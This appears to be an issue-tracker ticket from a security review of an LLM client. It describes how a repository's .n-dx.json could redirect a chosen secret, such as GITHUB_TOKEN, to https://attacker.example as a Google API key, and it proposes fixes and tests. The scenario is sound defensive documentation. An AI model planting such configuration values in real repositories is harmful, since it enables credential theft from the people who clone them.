---
id: "8b8fe23b-ee8b-4b82-8fb8-ddf64625c6cb"
level: "task"
title: "A repository's .n-dx.json can choose which environment variable is sent as the Google API key, and where it is sent"
status: "pending"
priority: "high"
tags:
  - "ndx-adversarial-review"
  - "severity:high"
  - "security"
  - "issue-cleanup"
source: "ndx-adversarial-review"
acceptanceCriteria:
  - "Closes #635 (follow-up): a repository cannot choose which variable is sent as a vendor API key, or where it is sent"
  - "A project-level .n-dx.json that sets llm.google.apiKeyEnv to GITHUB_TOKEN does not put GITHUB_TOKEN in a vendor CLI child's environment (test with a sentinel value)"
  - "A project-level llm.google.api_endpoint is not used for a request carrying the API key unless the user's own config or an accepted trust review sets it (test)"
  - "The child-env.ts comment on google keyEnv states the actual trust rule"
description: "Verdict: out-of-scope (pre-existing; seen while reviewing the vendor mode table, 56517553). Failure scenario: a cloned repository ships .n-dx.json with llm.vendor = \"google\", llm.google.apiKeyEnv = \"GITHUB_TOKEN\" and llm.google.api_endpoint = \"https://attacker.example\". Two paths follow. (1) packages/llm-client/src/child-env.ts VENDOR_ENV google keyEnv retains whatever apiKeyEnv names in a vendor CLI child; the comment there (\"cannot widen credential access\") is wrong, because it widens by exactly one name the repository picks. (2) packages/llm-client/src/google-api-provider.ts:170-172 reads process.env[apiKeyEnv], and :197 takes the base URL from google.api_endpoint, so the token is sent as x-goog-api-key to a host the repository chose. Reachability is not yet confirmed end to end: check which commands load the project-level .n-dx.json llm section and pick vendor google (sv analyze one-shot completions, ndx work api loop), and whether repo-trust (packages/llm-client/src/repo-trust.ts) surfaces either field; it currently surfaces guard.env.allow but not llm.*. Options: (a) take apiKeyEnv and api_endpoint only from user-level config, never the project file (strong, matches the Codex env_key rule from 56517553); (b) surface both in the repo-trust review as \"asked for more than the defaults\" and refuse them until the user accepts (keeps per-project overrides, more UI); (c) restrict apiKeyEnv to an allowlist (GEMINI_API_KEY, GOOGLE_API_KEY). Recommend (a), with (b) if per-project overrides are needed. Check the same shape for claude/codex api_endpoint fields.\n\n#635, which this follows up:\n\n> One table from vendor mode to the exact credential names that mode needs, applied only when the mode is active (its flag or config is set).\n\nCaptured during the T5 run (56517553); kept in layer 2 by Ryan on 2026-10-16, to run after T4."
assignee: "Ryan Keith <ryan.k@endash.us>"
lastModified: "2026-10-16T22:51:14.909Z"
lastModifiedBy: "Ryan Keith <ryan.k@endash.us>"
---
